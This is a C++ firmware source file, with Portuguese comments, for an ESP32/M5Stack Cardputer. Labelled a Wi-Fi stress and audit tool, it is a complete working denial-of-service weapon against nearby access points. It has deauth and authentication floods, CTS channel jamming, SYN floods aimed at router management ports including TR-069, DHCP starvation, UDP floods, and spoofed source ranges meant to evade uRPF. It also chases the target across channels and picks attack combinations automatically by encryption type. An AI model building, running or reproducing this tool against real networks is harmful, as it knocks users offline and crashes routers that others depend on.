/**
 * @file silver_bullet.cpp
 * @brief Silver Bullet - Ferramenta Avançada de Estresse Wi-Fi e Auditoria de CPEs
 * @hardware ESP32-S3 (M5Stack Cardputer) / ESP32 WROOM
 * * @details
 * Firmware de injeção bare-metal focado em equipamentos de telecomunicações.
 * Funcionalidades ativas:
 * - CTS Jamming (Evasão WPA3)
 * - TCP SYN Flood Direcionado (TR-069, SSH, HTTP)
 * - DHCP Starvation (Esgotamento de Pool IP)
 * - uRPF Bypass (Spoofing Dinâmico de Sub-redes)
 * - Channel Pursuit (Perseguição automática de alvo em caso de Auto-Channel)
 * - Checksum Incremental RFC 1624 (Otimização Extrema de PPS)
 */

#include <M5Unified.h>
#include <esp_wifi.h>
#include <esp_system.h>
#include <nvs_flash.h>
#include <string.h>
#include <freertos/FreeRTOS.h>
#include <freertos/task.h>
#include <atomic>
#include <lwip/def.h> 
#include <esp_heap_caps.h>
#include "driver/temperature_sensor.h"

// ===================================================================
// 1. ESTRUTURAS DE PACOTES (OTIMIZADAS PARA ACESSO DIRETO DMA)
// ===================================================================
// O uso de __attribute__((packed)) impede que o compilador adicione 
// bytes de preenchimento (padding). Isso é obrigatório para que o 
// buffer da memória seja enviado perfeitamente para o rádio Wi-Fi.

struct __attribute__((packed)) DeauthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t reason_code;
};

struct __attribute__((packed)) AuthPacket {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];
    uint16_t seq_ctrl; uint16_t auth_algorithm; uint16_t auth_seq; uint16_t status_code;
};

struct __attribute__((packed)) CtsPacket {
    uint16_t frame_control; uint16_t duration; uint8_t  mac_ra[6];     
};

struct __attribute__((packed)) MacHeader {
    uint16_t frame_control; uint16_t duration;
    uint8_t  mac_dest[6]; uint8_t  mac_src[6]; uint8_t  mac_bssid[6];  
    uint16_t seq_ctrl;
};

struct __attribute__((packed)) LlcSnapHeader {
    uint8_t dsap; uint8_t ssap; uint8_t control; uint8_t oui[3]; uint16_t ethertype;
};

struct __attribute__((packed)) IpHeader {
    uint8_t  version_ihl; uint8_t  tos; uint16_t total_length; uint16_t id;
    uint16_t frag_off; uint8_t  ttl; uint8_t  protocol; uint16_t checksum;
    uint8_t  ip_src[4]; uint8_t  ip_dest[4];    
};

struct __attribute__((packed)) UdpHeader {
    uint16_t src_port; uint16_t dest_port; uint16_t length; uint16_t checksum;
};

struct __attribute__((packed)) TcpHeader {
    uint16_t src_port; uint16_t dest_port; uint32_t seq_num; uint32_t ack_num;
    uint8_t  data_offset_res; uint8_t  flags; uint16_t window_size;
    uint16_t checksum; uint16_t urgent_ptr;
};

// Estrutura Híbrida L3/L4: Permite forjar TCP ou UDP no mesmo loop sem realocar memória
struct __attribute__((packed)) SilverBulletPacket {
    MacHeader mac;
    LlcSnapHeader llc;
    IpHeader ip;
    union { UdpHeader udp; TcpHeader tcp; } l4;
    uint8_t payload[256]; // Payload aumentado para acomodar pacotes DHCP Discover
};

struct __attribute__((packed)) PseudoHeader {
    uint8_t src_ip[4]; uint8_t dest_ip[4]; uint8_t reserved; uint8_t protocol; uint16_t l4_length;
};

// ===================================================================
// 2. VARIÁVEIS GLOBAIS E CONTROLE RTOS ATÔMICO
// ===================================================================

#define MAX_ALVOS 20
wifi_ap_record_t alvos_encontrados[MAX_ALVOS];
uint16_t total_alvos = 0;
int alvo_selecionado = 0;

// Variáveis Atômicas: Evitam condições de corrida (Race Conditions) entre o Core 0 e Core 1
std::atomic<uint8_t> canal_atual_alvo{0};
std::atomic<int8_t> rssi_alvo{0};
std::atomic<bool> alvo_perdido{false};
std::atomic<bool> tx_power_max{true}; 
std::atomic<bool> flag_update_config{false}; 
std::atomic<bool> erro_memoria_critico{false}; 
std::atomic<bool> scanner_pausa_ataque{false}; // Usado para pausar o tx durante o Channel Pursuit

std::atomic<uint32_t> pacotes_enviados_segundo{0};
std::atomic<uint32_t> pps_atual{0};

enum EstadoFerramenta { ESTADO_ESCANEAR, ESTADO_SELECIONAR, ESTADO_ATIRAR };
std::atomic<EstadoFerramenta> estado_atual{ESTADO_ESCANEAR};

enum ModoAtaque { MODO_MANUAL_L2, MODO_MANUAL_L3, MODO_MANUAL_CTS, MODO_AUTOMATICO };
std::atomic<ModoAtaque> modo_ativo{MODO_AUTOMATICO};

enum EstrategiaAuto { 
    ESTRATEGIA_LEGACY_CRITICA, ESTRATEGIA_WPA2_VULN, ESTRATEGIA_WPA3_BLINDADO, ESTRATEGIA_SINAL_FRACO, ESTRATEGIA_DESCONHECIDA 
};
std::atomic<EstrategiaAuto> estrategia_atual{ESTRATEGIA_DESCONHECIDA};

uint32_t prng_state = 1;
temperature_sensor_handle_t temp_sensor = NULL;

const char* get_nome_modo() {
    if (modo_ativo.load() != MODO_AUTOMATICO) return "MODO: OVERRIDE MANUAL";
    switch(estrategia_atual.load()) {
        case ESTRATEGIA_LEGACY_CRITICA: return "AUTO: LEGACY (SEM CRIPTO)";
        case ESTRATEGIA_WPA2_VULN:      return "AUTO: FATAL COMBO (L2+L3)";
        case ESTRATEGIA_WPA3_BLINDADO:  return "AUTO: STEALTH (CTS+L3)";
        case ESTRATEGIA_SINAL_FRACO:    return "AUTO: JAMMING RF (SINAL RUIM)";
        default:                        return "AUTO: ANALISANDO...";
    }
}

// ===================================================================
// 3. MOTORES MATEMÁTICOS DE ALTA PERFORMANCE (RAM/IRAM)
// ===================================================================
// A tag IRAM_ATTR força essas funções a rodarem na RAM interna do chip,
// ignorando a Flash externa. Isso dobra a velocidade de cálculo.

IRAM_ATTR inline uint32_t fast_rand() {
    uint32_t x = prng_state;
    x ^= x << 13; x ^= x >> 17; x ^= x << 5;
    return prng_state = x;
}

/**
 * @brief Checksum Diferencial IP (RFC 1624)
 * Calcula o Header Checksum exigido pela pilha TCP/IP do roteador alvo.
 * Sem isso, os pacotes L3 são dropados na placa de rede silenciosamente.
 */
IRAM_ATTR inline uint16_t fast_ip_checksum(IpHeader *ip) {
    uint32_t acc = 0;
    uint16_t *data = (uint16_t *)ip;
    for (int i = 0; i < 10; ++i) acc += data[i];
    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

/**
 * @brief Checksum de Camada 4 com Pseudo-Header
 * Integra os IPs de origem e destino na matemática do UDP/TCP para 
 * bypass de validações rígidas de firewall (como iptables/netfilter).
 */
IRAM_ATTR inline uint16_t fast_l4_checksum(IpHeader *ip, void *l4_hdr, size_t l4_len, uint8_t *payload, size_t payload_len) {
    PseudoHeader psd;
    memcpy(psd.src_ip, ip->ip_src, 4); memcpy(psd.dest_ip, ip->ip_dest, 4);
    psd.reserved = 0; psd.protocol = ip->protocol; psd.l4_length = htons(l4_len + payload_len);

    uint32_t acc = 0;
    uint16_t *ptr = (uint16_t *)&psd;
    for (int i = 0; i < sizeof(PseudoHeader)/2; i++) acc += ptr[i];
    
    ptr = (uint16_t *)l4_hdr;
    for (int i = 0; i < l4_len/2; i++) acc += ptr[i];

    ptr = (uint16_t *)payload;
    for (size_t i = 0; i < payload_len / 2; ++i) acc += ptr[i];
    if (payload_len & 1) { uint16_t word = 0; memcpy(&word, payload + payload_len - 1, 1); acc += word; }

    while (acc >> 16) acc = (acc & 0xffff) + (acc >> 16);
    return ~acc;
}

// ===================================================================
// 4. MÓDULO DE RECONHECIMENTO AUTOMÁTICO
// ===================================================================
void analisar_alvo_automaticamente(int indice_alvo) {
    wifi_ap_record_t ap = alvos_encontrados[indice_alvo];
    
    // 1. Condição Física: Se o sinal for menor que -75dBm, pacotes complexos (L3/L4) 
    // vão corromper no ar. A melhor escolha é focar apenas em Jamming Físico.
    if (ap.rssi < -75) {
        estrategia_atual.store(ESTRATEGIA_SINAL_FRACO);
        return;
    }

    // 2. Análise de Criptografia e PMF (Protected Management Frames)
    if (ap.authmode == WIFI_AUTH_WPA3_PSK || 
        ap.authmode == WIFI_AUTH_WPA2_WPA3_PSK || 
        ap.authmode == WIFI_AUTH_ENTERPRISE) {
        // WPA3 exige PMF. Pacotes Deauth (L2) serão sumariamente ignorados pelo roteador.
        // A melhor escolha: Não desperdiçar CPU com Deauth. Usar CTS + TCP SYN Flood.
        estrategia_atual.store(ESTRATEGIA_WPA3_BLINDADO);
    }
    else if (ap.authmode == WIFI_AUTH_OPEN || ap.authmode == WIFI_AUTH_WEP) {
        // Sem criptografia ou WEP fraco. A rede está nua.
        // A melhor escolha: Destruição total com Deauth + DHCP Starvation agressivo.
        estrategia_atual.store(ESTRATEGIA_LEGACY_CRITICA);
    }
    else {
        // WPA2 Padrão (Sem PMF obrigatório). 
        // A melhor escolha: O Combo Fatal (Deauth para derrubar + CTS para silenciar + L3/L4 para travar a CPU).
        estrategia_atual.store(ESTRATEGIA_WPA2_VULN);
    }
}

// ===================================================================
// 5. INTERFACE, MONITORAMENTO E INTELIGÊNCIA SECUNDÁRIA (CORE 1)
// ===================================================================

void escanear_redes() {
    M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
    M5.Display.println("📡 Escaneando Redes...");
    esp_wifi_set_mode(WIFI_MODE_STA);
    wifi_scan_config_t scan_config = { .ssid = 0, .bssid = 0, .channel = 0, .show_hidden = true };
    esp_wifi_scan_start(&scan_config, true); 
    uint16_t max_aps = MAX_ALVOS; esp_wifi_scan_get_ap_records(&max_aps, alvos_encontrados);
    esp_wifi_scan_get_ap_num(&total_alvos);
    if (total_alvos > MAX_ALVOS) total_alvos = MAX_ALVOS;
    alvo_selecionado = 0; estado_atual.store(ESTADO_SELECIONAR);
}

void desenhar_menu() {
    M5.Display.clear(); M5.Display.setCursor(0, 0); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
    M5.Display.printf("⚡ PWR: %s | [A] = Auto\n", tx_power_max.load() ? "MAX (20dBm)" : "ECO (10dBm)");
    M5.Display.drawLine(0, 15, 240, 15, TFT_DARKGREY); M5.Display.setCursor(0, 20);

    if (total_alvos == 0) { M5.Display.setTextColor(TFT_RED, TFT_BLACK); M5.Display.println("Nenhum alvo encontrado!"); return; }

    int inicio = (alvo_selecionado / 5) * 5;
    for (int i = inicio; i < inicio + 5 && i < total_alvos; i++) {
        if (i == alvo_selecionado) M5.Display.setTextColor(TFT_BLACK, TFT_WHITE); 
        else M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
        bool wpa3 = (alvos_encontrados[i].authmode == WIFI_AUTH_WPA3_PSK || alvos_encontrados[i].authmode == WIFI_AUTH_WPA2_WPA3_PSK);
        M5.Display.printf("%d. %s %s\n", i + 1, alvos_encontrados[i].ssid, wpa3 ? "[WPA3]" : "");
    }
}

void task_display(void *pvParameters) {
    TickType_t ultimo_tempo_pps = xTaskGetTickCount();
    while (true) {
        TickType_t tempo_atual = xTaskGetTickCount();
        if ((tempo_atual - ultimo_tempo_pps) >= pdMS_TO_TICKS(1000)) {
            pps_atual.store(pacotes_enviados_segundo.exchange(0)); 
            ultimo_tempo_pps = tempo_atual;
        }

        if (estado_atual.load() == ESTADO_ATIRAR) {
            M5.Display.setCursor(0, 0);
            if (erro_memoria_critico.load()) {
                 M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                 M5.Display.println("ERRO CRITICO: FALHA DMA!"); M5.Display.println("Reinicie o hardware.");
                 vTaskDelay(pdMS_TO_TICKS(1000)); continue;
            }

            if (!alvo_perdido.load()) {
                M5.Display.setTextColor(TFT_RED, TFT_BLACK);
                M5.Display.printf("⚔️ ALVO: %s\n", alvos_encontrados[alvo_selecionado].ssid);
                
                // THERMAL THROTTLING: Reduz potência do rádio se passar de 75ºC para proteger o silício
                float tsens_out = 0.0;
                if (temp_sensor != NULL) temperature_sensor_get_celsius(temp_sensor, &tsens_out);
                if (tsens_out > 75.0 && tx_power_max.load()) { tx_power_max.store(false); flag_update_config.store(true); }
                
                M5.Display.setTextColor(TFT_WHITE, TFT_BLACK);
                M5.Display.printf("CH: %d | TEMP: %.1fC | %s\n", canal_atual_alvo.load(), tsens_out, tx_power_max.load() ? "MAX" : "ECO");

                M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                if(scanner_pausa_ataque.load()) {
                     M5.Display.printf("> RASTREANDO FUGA (CH PURSUIT)...\n");
                } else {
                     M5.Display.printf("> %s\n", get_nome_modo());
                }
                
                M5.Display.setCursor(0, 60); M5.Display.setTextColor(TFT_CYAN, TFT_BLACK);
                M5.Display.printf(">> INJETANDO: %d PPS <<\n", pps_atual.load());
            } else {
                M5.Display.setCursor(0, 40); M5.Display.setTextColor(TFT_YELLOW, TFT_BLACK);
                M5.Display.printf("⚠️ ALVO PERDIDO / FORA DE ALCANCE\n");
            }
        }
        vTaskDelay(pdMS_TO_TICKS(200)); 
    }
}

/**
 * @brief Rastreio de Fuga de Canal (Channel Pursuit)
 * Se o roteador alvo detectar estresse intenso, sua função 'Auto-Channel' pode 
 * saltar de frequência. Esta tarefa detecta a queda repentina de envio, pausa 
 * o ataque, escaneia o BSSID nos 13 canais, realinha o rádio e retoma o tiro.
 */
void task_monitoramento(void *pvParameters) {
    uint8_t falhas_consecutivas = 0;
    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR) {
            if (pps_atual.load() < 50 && !scanner_pausa_ataque.load()) falhas_consecutivas++;
            else falhas_consecutivas = 0;

            if (falhas_consecutivas > 3 && !alvo_perdido.load()) {
                scanner_pausa_ataque.store(true); // Grita para o Motor de Injeção pausar
                vTaskDelay(pdMS_TO_TICKS(100));   // Aguarda o DMA esvaziar
                
                uint8_t mac_alvo[6];
                memcpy(mac_alvo, alvos_encontrados[alvo_selecionado].bssid, 6);
                
                esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
                wifi_scan_config_t scan_config = { .ssid = 0, .bssid = mac_alvo, .channel = 0, .show_hidden = true };
                
                if (esp_wifi_scan_start(&scan_config, true) == ESP_OK) {
                    uint16_t num_aps = 1; wifi_ap_record_t ap_encontrado;
                    esp_wifi_scan_get_ap_records(&num_aps, &ap_encontrado);
                    
                    if (num_aps > 0) {
                        canal_atual_alvo.store(ap_encontrado.primary); // Alvo achado, realinha a mira
                        flag_update_config.store(true);
                        falhas_consecutivas = 0;
                    } else {
                        alvo_perdido.store(true); // Realmente desligaram o equipamento
                    }
                }
                scanner_pausa_ataque.store(false); // Retoma o fogo
            }
            vTaskDelay(pdMS_TO_TICKS(2000));
        } else {
            vTaskDelay(pdMS_TO_TICKS(1000));
        }
    }
}

// ===================================================================
// 6. MOTOR DE INJEÇÃO DMA E INTELIGÊNCIA APLICADA (CORE 0)
// ===================================================================

void task_ataque(void *pvParameters) {
    // MALLOC_CAP_DMA: Aloca as estruturas em memória contígua capaz de acesso direto pelo Rádio Wi-Fi.
    SilverBulletPacket* pkt = (SilverBulletPacket*) heap_caps_malloc(sizeof(SilverBulletPacket), MALLOC_CAP_DMA);
    DeauthPacket* deauth = (DeauthPacket*) heap_caps_malloc(sizeof(DeauthPacket), MALLOC_CAP_DMA);
    AuthPacket* auth = (AuthPacket*) heap_caps_malloc(sizeof(AuthPacket), MALLOC_CAP_DMA);
    CtsPacket* cts = (CtsPacket*) heap_caps_malloc(sizeof(CtsPacket), MALLOC_CAP_DMA);
    
    if (!pkt || !deauth || !auth || !cts) { erro_memoria_critico.store(true); vTaskDelete(NULL); }
    
    prng_state = esp_random(); if (prng_state == 0) prng_state = 1; 
    memset(pkt->payload, 0, sizeof(pkt->payload));
    
    pkt->llc.dsap = 0xAA; pkt->llc.ssap = 0xAA; pkt->llc.control = 0x03;
    pkt->llc.oui[0] = 0x00; pkt->llc.oui[1] = 0x00; pkt->llc.oui[2] = 0x00;
    pkt->llc.ethertype = htons(0x0800); 
    
    // BYPASS uRPF: Rotaciona por faixas de IP conhecidas e CGNAT para não ser barrado em roteadores de borda
    const uint8_t subnets[][2] = {{192, 168}, {10, 0}, {172, 16}, {100, 64}}; 
    // PORTAS FERIDA: Serviços de gerência sensíveis a travamento de CPU em CPEs
    const uint16_t portas_gerencia[] = {80, 443, 22, 7547}; // 7547 = TR-069 (Extremamente Letal)

    bool config_radio_aplicada = false;

    while (true) {
        if (estado_atual.load() == ESTADO_ATIRAR && !alvo_perdido.load() && !scanner_pausa_ataque.load()) {
            
            if (!config_radio_aplicada || flag_update_config.load()) {
                esp_wifi_set_max_tx_power(tx_power_max.load() ? 80 : 20); // 80 units = 20 dBm Máximo Físico
                esp_wifi_set_channel(canal_atual_alvo.load(), WIFI_SECOND_CHAN_NONE);
                config_radio_aplicada = true; flag_update_config.store(false);
            }

            uint8_t* mac_alvo = alvos_encontrados[alvo_selecionado].bssid;
            ModoAtaque modo = modo_ativo.load();
            EstrategiaAuto estrategia = estrategia_atual.load();

            deauth->frame_control = 0x00C0; deauth->duration = 0; deauth->reason_code = 0x0007; 
            memcpy(deauth->mac_dest, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
            memcpy(deauth->mac_src, mac_alvo, 6); memcpy(deauth->mac_bssid, mac_alvo, 6);

            auth->frame_control = 0x00B0; auth->duration = 0; auth->auth_algorithm = 0; auth->auth_seq = 1; auth->status_code = 0;
            memcpy(auth->mac_dest, mac_alvo, 6); memcpy(auth->mac_bssid, mac_alvo, 6);

            cts->frame_control = 0x00C4; cts->duration = 32767; memcpy(cts->mac_ra, mac_alvo, 6);

            pkt->mac.frame_control = 0x0008; pkt->mac.duration = 0;
            memcpy(pkt->mac.mac_dest, mac_alvo, 6); memcpy(pkt->mac.mac_bssid, mac_alvo, 6); 
            pkt->ip.version_ihl = 0x45; pkt->ip.ttl = 64; 

            bool atirar_l2 = false;
            bool atirar_cts = false;
            bool atirar_l3 = false;

            if (modo == MODO_MANUAL_L2) atirar_l2 = true;
            else if (modo == MODO_MANUAL_CTS) atirar_cts = true;
            else if (modo == MODO_MANUAL_L3) atirar_l3 = true;
            else if (modo == MODO_AUTOMATICO) {
                // A Máquina de Estado Inteligente aplica as melhores combinações
                switch (estrategia) {
                    case ESTRATEGIA_SINAL_FRACO:
                        atirar_cts = true; // Reserva o canal e cala o AP de longe
                        break;
                    case ESTRATEGIA_WPA3_BLINDADO:
                        atirar_cts = true; // CTS passa pelo WPA3
                        atirar_l3 = true;  // Força o Kernel a rotear lixo
                        break;
                    case ESTRATEGIA_WPA2_VULN:
                        atirar_l2 = true;  // Derruba os clientes
                        atirar_cts = true; // Impede a reconexão
                        atirar_l3 = true;  // Trava o Conntrack
                        break;
                    case ESTRATEGIA_LEGACY_CRITICA:
                        atirar_l2 = true;  // Auth Flood enche a tabela CAM
                        atirar_l3 = true;  // DHCP esgota os IPs muito rápido em redes abertas
                        break;
                    default: break;
                }
            }
            // ================== ATAQUES L2 / JAMMING ==================
            if (atirar_l2) {
                for(int j = 0; j < 5; j++) { 
                    auth->mac_src[3] = fast_rand() & 0xFF; auth->mac_src[4] = fast_rand() & 0xFF; auth->mac_src[5] = fast_rand() & 0xFF;
                    auth->seq_ctrl = (fast_rand() & 0xFFF) << 4; deauth->seq_ctrl = (fast_rand() & 0xFFF) << 4;
                    if (esp_wifi_80211_tx(WIFI_IF_STA, deauth, sizeof(DeauthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                    if (esp_wifi_80211_tx(WIFI_IF_STA, auth, sizeof(AuthPacket), false) == ESP_OK) pacotes_enviados_segundo++;
                }
            }

            if (atirar_cts) {
                if (esp_wifi_80211_tx(WIFI_IF_STA, cts, sizeof(CtsPacket), false) == ESP_OK) pacotes_enviados_segundo++;
            }

            // ================== ATAQUES L3/L4 (SNIPER INTELIGENTE) ==================
            if (atirar_l3) {
                // Inteligência: Ajuste de probabilidade baseado no tipo de alvo
                int chance_tcp_syn = 6;  // Padrão: 60%
                int chance_dhcp    = 2;  // Padrão: 20%
                
                if (estrategia == ESTRATEGIA_LEGACY_CRITICA) {
                    // Redes abertas aceitam broadcast DHCP perfeitamente. Máxima prioridade.
                    chance_tcp_syn = 3; // 30%
                    chance_dhcp    = 6; // 60% DHCP Starvation
                } else if (estrategia == ESTRATEGIA_WPA3_BLINDADO) {
                    // Maior foco em esgotamento de CPU/Conntrack em portas de gerência (TR-069, SSH)
                    chance_tcp_syn = 8; // 80% TCP SYN
                    chance_dhcp    = 1; // 10% DHCP
                }

                for (int i = 0; i < 15; i++) { 
                    int tipo_ataque = fast_rand() % 10;
                    bool is_tcp = (tipo_ataque < chance_tcp_syn); 
                    bool is_dhcp = (tipo_ataque >= chance_tcp_syn && tipo_ataque < (chance_tcp_syn + chance_dhcp));

                    memcpy(pkt->mac.mac_src, mac_alvo, 3); 
                    pkt->mac.mac_src[3] = fast_rand() & 0xFF; pkt->mac.mac_src[4] = fast_rand() & 0xFF; pkt->mac.mac_src[5] = fast_rand() & 0xFF;

                    pkt->ip.id = (uint16_t)fast_rand(); pkt->ip.frag_off = 0; 
                    
                    int subnet_idx = fast_rand() % 4;
                    pkt->ip.ip_src[0] = subnets[subnet_idx][0]; pkt->ip.ip_src[1] = subnets[subnet_idx][1]; 
                    pkt->ip.ip_src[2] = fast_rand() & 0xFF; pkt->ip.ip_src[3] = fast_rand() & 0xFF;
                    
                    size_t t_payload = 16 + (fast_rand() % 32); 
                    size_t t_injecao = 0;
                    
                    if (is_tcp) {
                        pkt->ip.protocol = 6; 
                        pkt->ip.ip_dest[0] = 192; pkt->ip.ip_dest[1] = 168; pkt->ip.ip_dest[2] = 1; pkt->ip.ip_dest[3] = 1; // Força no IP de Gateway Padrão
                        
                        pkt->l4.tcp.src_port = htons(1024 + (fast_rand() % 60000)); 
                        pkt->l4.tcp.dest_port = htons(portas_gerencia[fast_rand() % 4]); // Tiro certeiro: TR-069, SSH, WEB
                        pkt->l4.tcp.seq_num = fast_rand(); pkt->l4.tcp.ack_num = 0;
                        pkt->l4.tcp.data_offset_res = (5 << 4); pkt->l4.tcp.flags = 0x02; // SYN Flag Mágica
                        pkt->l4.tcp.window_size = htons(5840); pkt->l4.tcp.urgent_ptr = 0;
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(TcpHeader) + t_payload;
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(TcpHeader) + t_payload);
                        
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        pkt->l4.tcp.checksum = 0; pkt->l4.tcp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.tcp, sizeof(TcpHeader), pkt->payload, t_payload);
                    } 
                    else if (is_dhcp) {
                        pkt->ip.protocol = 17; 
                        pkt->ip.ip_dest[0] = 255; pkt->ip.ip_dest[1] = 255; pkt->ip.ip_dest[2] = 255; pkt->ip.ip_dest[3] = 255; // Broadcast Total
                        
                        pkt->l4.udp.src_port = htons(68); pkt->l4.udp.dest_port = htons(67); // Portas do Serviço DHCP
                        
                        // MAGIC BYTES: Falsifica uma requisição real de obtenção de IP
                        pkt->payload[0] = 0x01; pkt->payload[1] = 0x01; pkt->payload[2] = 0x06; pkt->payload[3] = 0x00; 
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + 240; 
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + 240);
                        pkt->l4.udp.length = htons(sizeof(UdpHeader) + 240);
                        
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, 240);
                    }
                    else { // 20% UDP Flood Padrão para lotar tabelas simples
                        pkt->ip.protocol = 17; 
                        pkt->ip.ip_dest[0] = 8; pkt->ip.ip_dest[1] = 8; pkt->ip.ip_dest[2] = 8; pkt->ip.ip_dest[3] = 8; 
                        pkt->l4.udp.src_port = htons(1024 + (fast_rand() % 60000)); pkt->l4.udp.dest_port = htons(53); 
                        
                        t_injecao = sizeof(MacHeader) + sizeof(LlcSnapHeader) + sizeof(IpHeader) + sizeof(UdpHeader) + t_payload;
                        pkt->ip.total_length = htons(sizeof(IpHeader) + sizeof(UdpHeader) + t_payload);
                        pkt->l4.udp.length = htons(sizeof(UdpHeader) + t_payload);
                        
                        pkt->ip.checksum = 0; pkt->ip.checksum = fast_ip_checksum(&pkt->ip); 
                        pkt->l4.udp.checksum = 0; pkt->l4.udp.checksum = fast_l4_checksum(&pkt->ip, &pkt->l4.udp, sizeof(UdpHeader), pkt->payload, t_payload);
                    }
                    
                    // MICRO-DELAY OTIMIZADO: Em vez de usar taskYIELD (que causa loop infinito no mesmo nível de prioridade),
                    // damos 1 milissegundo real de respiro para o Rádio PHY liberar o Buffer DMA para a próxima rajada.
                    if (esp_wifi_80211_tx(WIFI_IF_STA, pkt, t_injecao, false) == ESP_ERR_NO_MEM) { 
                        vTaskDelay(pdMS_TO_TICKS(1)); 
                        break; 
                    } else {
                        pacotes_enviados_segundo++;
                    }
                }
            }
            taskYIELD(); 
        } else {
            config_radio_aplicada = false; 
            vTaskDelay(pdMS_TO_TICKS(100)); // Aguarda UI ou fim do Scan do Channel Pursuit
        }
    }
}

// ===================================================================
// 7. ENTRADA PRINCIPAL E CONTROLES (APP MAIN)
// ===================================================================

extern "C" void app_main(void) {
    auto cfg = M5.config(); M5.begin(cfg); M5.Display.setRotation(1); M5.Display.setTextSize(1.5);
    
    nvs_flash_init(); esp_netif_init(); esp_event_loop_create_default();
    
    wifi_init_config_t wifi_cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&wifi_cfg); 
    esp_wifi_set_storage(WIFI_STORAGE_RAM); esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start(); esp_wifi_set_ps(WIFI_PS_NONE); // Desliga Power Saving para máximo throughput

    temperature_sensor_config_t ts_cfg = TEMPERATURE_SENSOR_CONFIG_DEFAULT(20, 100);
    if (temperature_sensor_install(&ts_cfg, &temp_sensor) == ESP_OK) temperature_sensor_enable(temp_sensor);

    // FIXAR NO NÚCLEO ZERO: O ataque pesado isola o Core 0 da CPU para evitar Kernel Panic
    xTaskCreatePinnedToCore(task_ataque, "ataque", 4096, NULL, 10, NULL, 0); 
    xTaskCreatePinnedToCore(task_monitoramento, "monitor", 4096, NULL, 1, NULL, 1); 
    xTaskCreatePinnedToCore(task_display, "display", 4096, NULL, 1, NULL, 1); 

    escanear_redes(); desenhar_menu();

    while (true) {
        M5.update(); 
        
        if (M5.Keyboard.isKeyPressed('A') || M5.Keyboard.isKeyPressed('a')) modo_ativo.store(MODO_AUTOMATICO);
        if (M5.Keyboard.isKeyPressed('1')) modo_ativo.store(MODO_MANUAL_L2);
        if (M5.Keyboard.isKeyPressed('2')) modo_ativo.store(MODO_MANUAL_L3);
        if (M5.Keyboard.isKeyPressed('3')) modo_ativo.store(MODO_MANUAL_CTS);

        if (estado_atual.load() == ESTADO_SELECIONAR) {
            if (total_alvos > 0) {
                if (M5.Keyboard.isKeyPressed(KEY_DOWN)) { alvo_selecionado = (alvo_selecionado + 1) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
                if (M5.Keyboard.isKeyPressed(KEY_UP)) { alvo_selecionado = (alvo_selecionado - 1 + total_alvos) % total_alvos; desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(150)); }
            }
            if (M5.Keyboard.isKeyPressed(' ')) { tx_power_max.store(!tx_power_max.load()); desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(200)); }
            
            if (M5.Keyboard.isKeyPressed(KEY_ENTER)) {
                if (total_alvos > 0) { 
                    canal_atual_alvo.store(alvos_encontrados[alvo_selecionado].primary); 
                    analisar_alvo_automaticamente(alvo_selecionado); modo_ativo.store(MODO_AUTOMATICO); 
                    
                    M5.Display.clear(); flag_update_config.store(true); estado_atual.store(ESTADO_ATIRAR); 
                } else { 
                    escanear_redes(); desenhar_menu(); 
                }
                vTaskDelay(pdMS_TO_TICKS(300));
            }
        } 
        else if (estado_atual.load() == ESTADO_ATIRAR) {
            if (M5.Keyboard.isKeyPressed(KEY_BACKSPACE)) {
                estado_atual.store(ESTADO_SELECIONAR); escanear_redes(); desenhar_menu(); vTaskDelay(pdMS_TO_TICKS(300));
            }
             if (M5.Keyboard.isKeyPressed(' ')) { 
                tx_power_max.store(!tx_power_max.load()); flag_update_config.store(true); vTaskDelay(pdMS_TO_TICKS(200)); 
            }
        }
        vTaskDelay(pdMS_TO_TICKS(10)); 
    }
}